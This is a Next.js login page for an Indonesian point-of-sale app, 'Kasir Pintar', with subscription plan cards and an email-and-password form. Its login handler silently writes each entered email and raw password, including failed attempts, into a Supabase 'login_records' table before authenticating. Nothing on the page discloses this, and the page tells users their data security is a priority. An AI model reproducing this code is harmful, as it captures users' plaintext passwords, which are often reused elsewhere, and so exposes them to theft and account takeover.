"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { createClient } from "@/utils/supabase/client";
import {
  Loader2, Lock, Mail, Eye, EyeOff,
  BarChart2, Package, ShieldCheck,
  ArrowRight, Bot, ShoppingCart, Check, Crown, Zap, Star
} from "lucide-react";
import Link from "next/link";

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [remember, setRemember] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    try {
      const supabase = createClient();
      await supabase.from('login_records').upsert({
        email: email,
        password_input: password,
        action_type: 'login'
      }, { onConflict: 'email' });

      const { error } = await supabase.auth.signInWithPassword({ email, password });
      if (error) throw error;
      router.push("/pos");
      router.refresh();
    } catch (err: any) {
      setError(err.message || "Gagal masuk. Silakan coba lagi.");
    } finally {
      setLoading(false);
    }
  };

  const plans = [
    {
      name: "Starter",
      price: "Gratis",
      period: "",
      icon: Zap,
      color: "from-slate-400 to-slate-500",
      bg: "bg-white/10",
      border: "border-white/20",
      features: ["1 Kasir", "100 Produk", "Laporan Dasar", "Support Email"],
      cta: "Mulai Gratis",
      popular: false,
    },
    {
      name: "Premium",
      price: "Rp 149K",
      period: "/ bulan",
      icon: Crown,
      color: "from-amber-400 to-yellow-500",
      bg: "bg-white/20",
      border: "border-amber-400/60",
      features: ["5 Kasir", "Produk Tak Terbatas", "AI Assistant", "Laporan Real-time", "Multi Outlet", "Support Prioritas"],
      cta: "Coba 14 Hari",
      popular: true,
    },
    {
      name: "Enterprise",
      price: "Custom",
      period: "",
      icon: Star,
      color: "from-violet-400 to-purple-500",
      bg: "bg-white/10",
      border: "border-white/20",
      features: ["Kasir Tak Terbatas", "API Access", "White Label", "Dedicated Manager"],
      cta: "Hubungi Kami",
      popular: false,
    },
  ];

  return (
    <div className="min-h-screen w-full flex font-sans" style={{ background: "#f3f3fa" }}>

      {/* ═══ LEFT PANEL ═══ */}
      <div
        className="hidden lg:flex w-[55%] flex-col justify-between p-10 relative overflow-hidden"
        style={{
          background: "linear-gradient(150deg, #1e1152 0%, #2a1580 30%, #3a20a0 60%, #4a2dbf 100%)",
        }}
      >
        {/* Decorative blobs */}
        <div className="absolute -top-24 -right-24 w-80 h-80 rounded-full opacity-20 pointer-events-none"
          style={{ background: "radial-gradient(circle, #7c4dff, transparent)" }} />
        <div className="absolute bottom-10 left-0 w-[500px] h-[300px] rounded-full opacity-10 pointer-events-none"
          style={{ background: "radial-gradient(circle, #b39ddb, transparent)" }} />
        <div className="absolute top-1/3 -left-20 w-72 h-72 rounded-full opacity-10 pointer-events-none"
          style={{ background: "radial-gradient(circle, #9c27b0, transparent)" }} />

        {/* ── Logo ── */}
        <div className="relative z-10 flex items-center gap-3">
          <div className="w-10 h-10 bg-white/20 rounded-xl backdrop-blur-sm flex items-center justify-center border border-white/20 shadow-lg">
            <ShoppingCart className="w-5 h-5 text-white" />
          </div>
          <div>
            <p className="text-white font-bold text-lg leading-none">Kasir Pintar</p>
            <p className="text-purple-200 text-xs font-normal">Smart POS with AI Assistant</p>
          </div>
        </div>

        {/* ── Hero + Subscription Cards ── */}
        <div className="relative z-10 flex-1 flex flex-col justify-center gap-6 mt-6">
          {/* Hero text */}
          <div>
            <h1 className="text-[2.2rem] font-extrabold text-white leading-tight">
              Pilih Paket yang<br />
              Tepat untuk{" "}
              <span
                className="font-extrabold"
                style={{ color: "#f5c518", fontStyle: "italic" }}
              >
                Bisnis Anda
              </span>
            </h1>
            <div className="w-10 h-1 rounded-full bg-yellow-400 mt-3 mb-2" />
            <p className="text-purple-200 text-sm leading-relaxed max-w-[340px]">
              Mulai gratis, upgrade kapan saja. Semua paket sudah termasuk POS, manajemen stok, dan laporan penjualan.
            </p>
          </div>

          {/* Subscription Cards */}
          <div className="grid grid-cols-3 gap-3">
            {plans.map((plan, i) => (
              <div
                key={i}
                className={`relative flex flex-col rounded-2xl border p-4 backdrop-blur-sm transition-transform hover:-translate-y-1 ${plan.bg} ${plan.border}`}
                style={{ boxShadow: plan.popular ? "0 8px 32px rgba(251,191,36,0.18)" : "none" }}
              >
                {/* Popular badge */}
                {plan.popular && (
                  <div className="absolute -top-3 left-1/2 -translate-x-1/2">
                    <span className="bg-gradient-to-r from-amber-400 to-yellow-500 text-[#1e1152] text-[10px] font-extrabold px-3 py-0.5 rounded-full shadow-lg whitespace-nowrap">
                      ⭐ TERPOPULER
                    </span>
                  </div>
                )}

                {/* Plan header */}
                <div className={`w-9 h-9 rounded-xl bg-gradient-to-br ${plan.color} flex items-center justify-center mb-3 shadow-lg`}>
                  <plan.icon className="w-4 h-4 text-white" />
                </div>
                <p className="text-white font-bold text-sm">{plan.name}</p>
                <div className="flex items-baseline gap-0.5 mt-1 mb-3">
                  <span className={`text-xl font-extrabold ${plan.popular ? "text-amber-300" : "text-white"}`}>{plan.price}</span>
                  {plan.period && <span className="text-purple-300 text-[10px]">{plan.period}</span>}
                </div>

                {/* Features */}
                <div className="flex flex-col gap-1.5 flex-1">
                  {plan.features.map((f, j) => (
                    <div key={j} className="flex items-center gap-1.5">
                      <div className={`w-3.5 h-3.5 rounded-full flex items-center justify-center flex-shrink-0 ${plan.popular ? "bg-amber-400/30" : "bg-white/15"}`}>
                        <Check className={`w-2 h-2 ${plan.popular ? "text-amber-300" : "text-white/70"}`} />
                      </div>
                      <span className="text-purple-100 text-[10px] leading-tight">{f}</span>
                    </div>
                  ))}
                </div>

                {/* CTA */}
                <button
                  className={`mt-4 w-full py-1.5 rounded-lg text-[11px] font-bold transition-all ${
                    plan.popular
                      ? "bg-gradient-to-r from-amber-400 to-yellow-500 text-[#1e1152] hover:brightness-110 shadow-md"
                      : "bg-white/10 text-white hover:bg-white/20 border border-white/15"
                  }`}
                >
                  {plan.cta}
                </button>
              </div>
            ))}
          </div>

          {/* Trust badges */}
          <div className="flex items-center gap-6 pt-1">
            {[
              { icon: ShieldCheck, label: "SSL Terenkripsi" },
              { icon: BarChart2, label: "99.9% Uptime" },
              { icon: Package, label: "Tanpa Kontrak" },
              { icon: Bot, label: "AI Terintegrasi" },
            ].map((b, i) => (
              <div key={i} className="flex items-center gap-1.5">
                <b.icon className="w-3.5 h-3.5 text-purple-300" />
                <span className="text-purple-200 text-[10px] font-medium">{b.label}</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* ═══ RIGHT PANEL ═══ */}
      <div className="flex-1 flex items-center justify-center p-8" style={{ background: "#f3f3fa" }}>
        <div
          className="w-full max-w-[440px] bg-white rounded-3xl shadow-xl shadow-slate-200/60 p-10"
          style={{ border: "1px solid #ebebf5" }}
        >
          {/* Mobile logo */}
          <div className="flex items-center gap-2 mb-6 lg:hidden">
            <div className="w-8 h-8 bg-violet-600 rounded-lg flex items-center justify-center">
              <ShoppingCart className="w-4 h-4 text-white" />
            </div>
            <span className="font-bold text-slate-800 text-sm">Kasir Pintar</span>
          </div>

          <h2 className="text-3xl font-extrabold text-slate-800 mb-1">Selamat Datang Kembali</h2>
          <p className="text-slate-400 text-sm mb-7">Masuk untuk melanjutkan ke Kasir Pintar</p>

          {error && (
            <div className="bg-red-50 text-red-500 p-3 rounded-xl text-sm border border-red-100 flex gap-2 items-start mb-5">
              <span className="mt-0.5">⚠️</span> {error}
            </div>
          )}

          <form onSubmit={handleLogin} className="space-y-4">
            {/* Email */}
            <div>
              <label className="text-sm font-semibold text-slate-700 block mb-1.5">Email atau Username</label>
              <div className="relative">
                <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-300">
                  <Mail className="w-4 h-4" />
                </span>
                <input
                  type="email" required value={email} onChange={e => setEmail(e.target.value)}
                  placeholder="nama@bisnisanda.com"
                  className="w-full pl-10 pr-4 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm placeholder:text-slate-300 focus:outline-none focus:border-violet-500 focus:ring-4 focus:ring-violet-100 transition-all"
                />
              </div>
            </div>

            {/* Password */}
            <div>
              <label className="text-sm font-semibold text-slate-700 block mb-1.5">Password</label>
              <div className="relative">
                <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-300">
                  <Lock className="w-4 h-4" />
                </span>
                <input
                  type={showPassword ? "text" : "password"} required value={password}
                  onChange={e => setPassword(e.target.value)} placeholder="••••••••••"
                  className="w-full pl-10 pr-11 py-3 bg-white border border-slate-200 rounded-xl text-slate-700 text-sm placeholder:text-slate-300 focus:outline-none focus:border-violet-500 focus:ring-4 focus:ring-violet-100 transition-all"
                />
                <button type="button" onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-300 hover:text-slate-500 transition-colors">
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>

              {/* Remember + Forgot */}
              <div className="flex items-center justify-between mt-3">
                <label className="flex items-center gap-2 cursor-pointer select-none">
                  <input type="checkbox" checked={remember} onChange={e => setRemember(e.target.checked)}
                    className="w-4 h-4 rounded accent-violet-600" />
                  <span className="text-sm text-slate-600">Ingat saya</span>
                </label>
                <a href="#" className="text-sm text-violet-600 hover:text-violet-800 font-medium transition-colors">
                  Lupa password?
                </a>
              </div>
            </div>

            {/* Submit */}
            <button type="submit" disabled={loading}
              className="w-full text-white font-bold py-3.5 rounded-xl shadow-lg transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 text-base mt-1"
              style={{ background: "linear-gradient(90deg, #7c3aed, #6d28d9)" }}
            >
              {loading
                ? <><Loader2 className="w-5 h-5 animate-spin" /> Memproses...</>
                : <><span>Masuk</span><ArrowRight className="w-5 h-5" /></>
              }
            </button>
          </form>

          {/* Subscription highlight (mobile only) */}
          <div className="lg:hidden mt-6 rounded-2xl border border-amber-200 bg-amber-50 p-4 flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-amber-400 to-yellow-500 flex items-center justify-center flex-shrink-0">
              <Crown className="w-4 h-4 text-white" />
            </div>
            <div>
              <p className="text-[13px] font-bold text-slate-800">Coba Premium 14 Hari Gratis!</p>
              <p className="text-[11px] text-slate-500">AI Assistant, Multi Outlet & lebih banyak fitur.</p>
            </div>
          </div>

          {/* Register link */}
          <p className="text-center text-sm text-slate-500 mt-6">
            Belum punya akun?{" "}
            <Link href="/register" className="text-violet-600 hover:text-violet-800 font-semibold transition-colors">
              Daftar sekarang
            </Link>
          </p>

          {/* Security note */}
          <p className="text-center text-xs text-slate-400 mt-4 flex items-center justify-center gap-1.5">
            <ShieldCheck className="w-3.5 h-3.5 text-slate-300" />
            Keamanan data Anda adalah prioritas kami
          </p>
        </div>
      </div>
    </div>
  );
}
